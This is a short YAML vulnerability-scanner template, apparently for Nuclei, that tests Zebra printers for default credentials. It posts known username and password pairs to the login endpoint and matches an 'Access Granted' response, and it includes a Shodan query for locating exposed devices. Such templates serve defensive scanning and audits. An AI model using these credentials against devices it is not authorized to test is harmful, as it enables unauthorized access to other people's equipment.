id: zebra-default-login

info:
  name: Zebra - Default Login
  author: y0no
  severity: high
  description: |
    Zebra default login credentials was discovered.
  metadata:
    verified: true
    max-request: 4
    shodan-query: title:"Zebra"
  tags: zebra,default-login,misconfig,printer,intrusive,vuln

http:
  - raw:
      - |
        POST /authorize HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        0={{username}}&1={{password}}

    attack: pitchfork
    payloads:
      username:
        - 1234
        - admin
      password:
        - ''
        - 1234

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ">Access Granted. This IP Address now"

      - type: status
        status:
          - 200
